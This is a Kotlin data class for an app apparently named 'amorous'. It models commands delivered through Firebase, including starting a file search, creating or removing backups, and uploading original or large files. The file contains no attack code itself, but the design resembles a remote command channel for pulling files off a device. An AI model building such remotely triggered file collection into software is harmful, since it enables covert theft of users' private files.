package com.anonymous.amorous.data.models

import com.anonymous.amorous.empty
import com.google.firebase.firestore.PropertyName

data class Command(var command: String = String.empty(),
                   var date: Long = 0L,
                   var userUid: String = String.empty(),
                   var haveNewCommand: Long = 1L) {

    fun commands(): List<String> = this.command.split(",")

    companion object {
        const val COMMAND_START_FIND_FILE = "command_start_find_file_worker"
        const val COMMAND_CREATE_BACKUP_FILE = "command_create_back_file_worker"
        const val COMMAND_REMOVE_BACKUP_FILE = "command_remove_back_file_worker"
        const val COMMAND_UPLOAD_ORIGINAL = "command_upload_original"
        const val COMMAND_UPLOAD_LARGE_FILE = "command_upload_large_file"
    }
}